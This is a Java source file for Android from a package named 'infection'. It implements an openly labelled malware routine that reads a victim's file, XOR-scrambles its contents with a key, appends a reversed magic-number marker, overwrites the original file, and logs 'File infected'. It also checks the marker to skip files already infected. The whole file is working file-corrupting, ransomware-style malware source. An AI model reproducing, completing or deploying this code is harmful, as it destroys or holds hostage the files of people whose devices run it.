package infection;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import android.util.Log;

public class Item extends Node implements IInfected {

	private StringBuilder map;

	public Item(File file) {
		super(file);
		map = new StringBuilder();
	}

	/* Standard IO method */
	private void readFile() {
		try {
			FileReader fr = new FileReader(file.getAbsolutePath());
			BufferedReader br = new BufferedReader(fr);
			String tmp = new String();
			while ((tmp = br.readLine()) != null)
				map.append(tmp);
			br.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void writeFile() {
		try {
			FileWriter fw = new FileWriter(file.getAbsolutePath());
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(map.toString());
			bw.flush();
			bw.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**/

	/* Malware method */
	@Override
	public void XOR() {
		for (int i = 0; i < map.length(); i++)
			map.setCharAt(i, (char) (map.charAt(i) ^ key));
	}

	@Override
	public void markMagicNumber() {
		map.append(magicNumber);
		map.reverse();
	}

	@Override
	public String infected() {
		readFile();
		if (isInfected())
			return JSON();

		XOR();
		markMagicNumber();
		writeFile();
		Log.w("Malware", "File infected : " + file.getAbsolutePath());
		return JSON();
	}

	@Override
	public boolean isInfected() {
		// don't forget to reverse the magic number
		return (map.charAt(magicPosition) == magicNumber[1] && map
				.charAt(magicPosition + 1) == magicNumber[0]);
	}

	/**/

	/* JSON format */
	public String JSON() {
		return file.getName();
	}
}
